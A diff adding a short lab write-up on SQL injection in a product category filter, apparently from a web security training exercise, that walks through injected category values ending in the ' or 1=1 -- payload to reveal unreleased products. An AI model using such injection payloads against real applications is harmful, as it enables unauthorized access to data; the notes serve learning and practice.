@@ -1,0 +1,17 @@
+SQL injection - product category filter
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
+
+End goal: display all products both released and unreleased.
+
+Analysis:
+
+SELECT * FROM products WHERE category = 'Pets' AND released = 1
+
+SELECT * FROM products WHERE category = ''' AND released = 1 -> category field is equal to nothing
+
+SELECT * FROM products WHERE category = ''--' AND released = 1 -> ignores AND released = 1, doesn't generate an error
+
+SELECT * FROM products WHERE category = '' ->this is what is being run when --
+
+SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 -> either category is equal to nothing or conditional statement 1=1 evaluates to true
